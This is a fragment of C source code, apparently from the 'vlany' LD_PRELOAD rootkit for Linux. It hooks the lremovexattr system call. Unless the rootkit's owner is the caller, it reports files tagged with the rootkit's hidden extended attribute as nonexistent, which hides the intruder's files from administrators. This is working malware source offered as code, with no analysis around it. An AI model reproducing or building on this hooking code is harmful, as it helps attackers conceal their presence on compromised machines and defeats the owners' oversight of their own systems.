int lremovexattr(const char *path, const char *name)
{
    #ifdef DEBUG
        printf("[vlany] lremovexattr() called\n");
    #endif

    HOOK(old_lremovexattr, CLREMOVEXATTR);

    if(owned()) return old_lremovexattr(path, name);

    if(hidden_lxattr(path)) { errno = ENOENT; return -1; }

    return old_lremovexattr(path, name);
}
